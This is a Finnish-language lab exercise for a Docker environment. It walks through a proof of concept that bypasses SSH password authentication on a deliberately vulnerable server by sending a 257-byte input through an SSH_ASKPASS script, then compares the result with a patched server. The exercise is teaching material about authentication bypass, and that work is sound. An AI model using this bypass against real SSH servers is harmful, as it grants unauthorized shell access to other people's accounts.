> [!NOTE]
> **🇬🇧 Note on the use of AI:** AI tools such as ChatGPT, Gemini, and Copilot were used to help develop this material.  
> **🇫🇮 Huomio tekoälyn käytöstä:** Tämän materiaalin laatimisessa on hyödynnetty tekoälytyökaluja, kuten ChatGPT:tä, Geminiä ja Copilotia.  

# SSHole – interaktiivinen SSH-kirjautuminen laboratoriossa

## Tavoite

Havainnollistaa suljetussa Docker-laboratoriossa, miten haavoittuvan SSH-palvelimen salasanatodennus voidaan ohittaa, ja verrata tulosta korjattuun palvelimeen. Testaa vain omaa, eristettyä laboratorioympäristöä.

## 1. Avaa asiakaskontti

Suorita **isäntäkoneen PowerShellissä**:

```powershell
docker compose exec ssh-client sh
```

Kaikki seuraavat `ssh`-komennot suoritetaan **ssh-client-kontissa**, ei SSH-yhteyden kautta avatussa palvelinkontissa. Haavoittuvassa palvelinkontissa ei välttämättä ole SSH-asiakasohjelmaa asennettuna, eikä sitä tarvita.

## 2. Testaa tavallinen kirjautuminen

Asiakaskontissa:

```sh
ssh -o StrictHostKeyChecking=accept-new donor@ssh-vulnerable
```

Anna laboratorioympäristön salasana `donorpass`. Kirjautumisen jälkeen tarkista, missä olet:

```sh
whoami
id
hostname
```

Palaa asiakaskonttiin:

```sh
exit
```

**Tärkeää:** `exit` sulkee etäpalvelimen istunnon. Tarkista `hostname`, jotta tiedät olevasi taas asiakaskontissa ennen seuraavaa SSH-komentoa.

## 3. Testaa väärä salasana

Asiakaskontissa:

```sh
ssh victim@ssh-vulnerable
```

Syötä esimerkiksi `wrongpassword`. Kirjautumisen pitäisi epäonnistua. Jos SSH kysyy salasanaa useita kertoja, voit lopettaa yrityksen painamalla `Ctrl+C`.

## 4. Valmistele 257 tavun testisyöte

Luo **asiakaskontissa** SSH_ASKPASS-apuskripti, jotta pitkää syötettä ei tarvitse kirjoittaa käsin:

```sh
cat > /tmp/askpass.sh <<'EOF2'
#!/bin/sh
head -c 257 /dev/zero | tr '\0' 'A'
EOF2
chmod +x /tmp/askpass.sh
```

Tämä tuottaa 257 A-merkkiä. Se ei ole `victim`-käyttäjän oikea salasana.

## 5. Näytä haavoittuva SSH-kirjautuminen

Suorita asiakaskontissa:

```sh
SSH_ASKPASS=/tmp/askpass.sh \
SSH_ASKPASS_REQUIRE=force \
DISPLAY=:0 \
ssh -tt \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o KbdInteractiveAuthentication=no \
  -o NumberOfPasswordPrompts=3 \
  victim@ssh-vulnerable
```

PoC-ympäristössä kirjautumisen odotetaan onnistuvan. Ensimmäinen salasanayritys voi epäonnistua ja seuraava onnistua saman yhteyden aikana.

Tarkista etäpalvelimella:

```sh
whoami
id
hostname
cat /etc/alpine-release
```

Tuloksen pitäisi osoittaa, että olet `victim`-käyttäjänä palvelimella `ssh-vulnerable`. Palaa asiakaskonttiin:

```sh
exit
```

## 6. Vertaa korjattuun palvelimeen

Suorita **asiakaskontissa** sama testi vaihtaen vain kohde:

```sh
SSH_ASKPASS=/tmp/askpass.sh \
SSH_ASKPASS_REQUIRE=force \
DISPLAY=:0 \
ssh -tt \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o KbdInteractiveAuthentication=no \
  -o NumberOfPasswordPrompts=3 \
  victim@ssh-patched
```

Odotettu tulos: kirjautuminen hylätään. Vertailun luotettavuuden vuoksi tarkista lisäksi, että korjatun palvelimen normaali `donor`-kirjautuminen toimii:

```sh
ssh donor@ssh-patched
```

Anna `donorpass` ja poistu onnistuneen kirjautumisen jälkeen komennolla `exit`.

## 7. Seuraa palvelinten lokitietoja

Avaa **toinen PowerShell-ikkuna isäntäkoneella** ja suorita:

```powershell
docker compose logs -f ssh-vulnerable ssh-patched
```

Lokien seuranta lopetetaan `Ctrl+C`-näppäinyhdistelmällä.

## 8. Tulkinta ja huomioita

| Testi | Haavoittuva palvelin | Korjattu vertailupalvelin |
|---|---|---|
| Oikea `donor`-salasana | Hyväksytään | Hyväksytään |
| Väärä `victim`-salasana | Hylätään | Hylätään |
| 257 tavun testisyöte `victim`-tilille | Hyväksytään PoC-ympäristössä | Hylätään |

- Onnistuminen tarkoittaa, että SSH-palvelimella voidaan suorittaa komentoja `victim`-käyttäjän oikeuksilla ilman oikeaa salasanaa.
- Tarkista aina `hostname` ja `whoami`: komentotulkki voi olla joko asiakkaassa tai etäpalvelimessa.
- Jos komentoa `ssh` ei löydy, varmista ensin, ettet ole jo kirjautunut palvelinkonttiin. SSH-asiakasohjelma on tarkoitus suorittaa `ssh-client`-kontissa.
- Jos `ssh -tt` ei tuota interaktiivista istuntoa, vertaa tulosta aiemmin toimineeseen `/exploit.sh`-testiin ja tutki SSH-lokeja.
- Dockerin sisäinen verkko ei yksin takaa täydellistä eristystä: suorita tarkoituksella haavoittuva laboratorio erillisessä testiympäristössä, älä julkaise SSH-portteja ulkoverkkoon.

## Pohdintakysymykset

1. Miksi `victim`-tilin kirjautumisen pitäisi epäonnistua, vaikka syöte olisi hyvin pitkä?
2. Miten osoitat, että kirjautuminen todella onnistui eikä kyse ollut vain skriptin virheellisestä ilmoituksesta?
3. Miksi oikealla salasanalla tehty `donor`-kontrollitesti on tärkeä?
4. Mitä eroa on salasanan murtamisella ja autentikoinnin ohituksella?
